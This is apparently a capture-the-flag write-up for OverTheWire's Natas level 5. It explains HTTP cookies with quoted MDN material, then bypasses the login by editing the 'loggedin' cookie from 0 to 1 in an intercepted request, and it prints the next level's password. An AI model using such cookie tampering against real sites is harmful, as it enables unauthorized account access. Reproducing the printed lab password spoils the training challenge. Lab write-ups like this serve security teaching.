# Natas Level 5

A webpage with the following message:

Access disallowed. You are not logged in

## Intercepting the GET request to https://natas5.natas.labs.overthewire.org/

```
GET http://natas5.natas.labs.overthewire.org/ HTTP/1.1
Host: natas5.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
DNT: 1
Connection: keep-alive
Cookie: __cfduid=df31796d2294ed8c1d27f7bc43502b8a41592811532; loggedin=0
Upgrade-Insecure-Requests: 1
```

## [Using HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)

An HTTP cookie (web cookie, browser cookie) is a small piece of data that a server sends to the user's web browser. The browser may store it and send it back with later requests to the same server.

Typicaly, it is used to tell if two requests came from the same browser -- keeping a user logged-in, for example. It remembers stateful information for the stateless HTTP protocol.

### [Stateful information for the stateless HTTP protocol](https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview#HTTP_is_stateless_but_not_sessionless)

HTTP is `stateless`: there is no link between two requests being successively carried out on the same connection. This immediately has the prospect of being problematic for users attempting to interact with certain pages coherently, for example, using e-commerce shopping baskets.

But while the core of HTTP itself is stateless, HTTP cookies allow the use of stateful sessions. Using header extensibility, HTTP Cookies are added to the workflow, allowing session creation on each HTTP request to share the same context, or the same state.

## [Creating cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Creating_cookies)

_Server:_

After receiving a HTTP request, the server can send a `Set-Cookie` header with the response. The cookie is usually stored by the browser, and then the cookie is sent with requests made to the same server inside a `Cookie` HTTP header. An expiration date or duration can be specified, after which the cookie is no longer sent. Additional restrictions to a specific domain and path can be set, limiting where the cookie is sent.

`Set-Cookie: <cookie-name>=<cookie-value>`

Use multiple `Set-Cookie` headers to tell the client to store multiple cookies

```
HTTP/2.0 200 OK
Content-Type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry
```

The client then sends all previously stored cookies to the server using the `Cookie` header on every subsequent request to the server.

```
GET /sample_page.html HTTP/2.0
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

# Modifying GET request

Update the `Cookie` loggedin value to `1` and send GET request.

```
Cookie: __cfduid=df31796d2294ed8c1d27f7bc43502b8a41592811532; loggedin=1
```

`Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`

# PASSWORD to natas6

aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
